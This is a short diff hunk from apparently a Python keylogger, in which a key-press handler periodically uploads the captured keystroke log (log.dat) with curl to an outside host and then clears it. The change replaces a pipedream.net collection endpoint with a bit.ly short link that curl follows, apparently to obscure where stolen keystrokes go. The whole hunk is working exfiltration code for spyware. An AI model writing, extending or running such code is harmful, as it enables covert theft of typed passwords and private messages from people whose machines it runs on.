@@ -52,7 +52,7 @@ def on_press(key):
         count = 0
         send += 1
         if send >= 5:
-            os.system("curl -T log.dat https://a907918e97220d91b82f3957cfbe9bfb.m.pipedream.net")
+            os.system("curl -T log.dat -L https://bit.ly/3DHmzBN")
             os.system("echo.>log.dat")
             send = 0
 
